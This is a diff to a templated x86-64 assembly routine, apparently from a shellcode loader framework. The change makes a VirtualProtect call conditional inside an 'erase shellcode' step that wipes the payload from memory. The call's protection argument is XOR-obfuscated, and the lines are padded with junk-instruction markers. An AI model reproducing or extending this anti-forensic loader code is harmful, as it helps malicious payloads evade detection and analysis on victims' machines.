@@ -418,19 +418,21 @@ entry:
 // =================================== erase shellcode ===================================
 
 {{if .NeedEraseShellcode}}
-  // adjust memory region protect before erase
-  mov rax, [rsp+0x20]                          {{igi}} // address of VirtualProtect
-  mov rcx, [rsp+0x08]                          {{igi}} // lpAddress
-  sub rsp, 0x08                                {{igi}} // for store old protect
-  mov rdx, {{hex .MemRegionSize}}              {{igi}} // dwSize
-  mov r8, {{hex .PAData.Protect}}              {{igi}} // flNewProtect PAGE_READWRITE
-  mov r10, {{hex .PAKey.Protect}}              {{igi}} // set decrypt key
-  xor r8, r10                                  {{igi}} // decrypt argument
-  mov r9, rsp                                  {{igi}} // lpflOldProtect
-  sub rsp, 0x28                                {{igi}} // reserve stack for call convention
-  call rax                                     {{igi}} // call VirtualProtect
-  add rsp, 0x28                                {{igi}} // restore stack for call convention
-  add rsp, 0x08                                {{igi}} // restore stack for old protect
+  {{if .NeedAdjustProtect}}
+    // adjust memory region protect before erase
+    mov rax, [rsp+0x20]                        {{igi}} // address of VirtualProtect
+    mov rcx, [rsp+0x08]                        {{igi}} // lpAddress
+    sub rsp, 0x08                              {{igi}} // for store old protect
+    mov rdx, {{hex .MemRegionSize}}            {{igi}} // dwSize
+    mov r8, {{hex .PAData.Protect}}            {{igi}} // flNewProtect PAGE_READWRITE
+    mov r10, {{hex .PAKey.Protect}}            {{igi}} // set decrypt key
+    xor r8, r10                                {{igi}} // decrypt argument
+    mov r9, rsp                                {{igi}} // lpflOldProtect
+    sub rsp, 0x28                              {{igi}} // reserve stack for call convention
+    call rax                                   {{igi}} // call VirtualProtect
+    add rsp, 0x28                              {{igi}} // restore stack for call convention
+    add rsp, 0x08                              {{igi}} // restore stack for old protect
+  {{end}}
 
   // overwrite memory data
   mov {{.RegV.rdx}}, [rsp+0x08]                {{igi}} // address of memory page
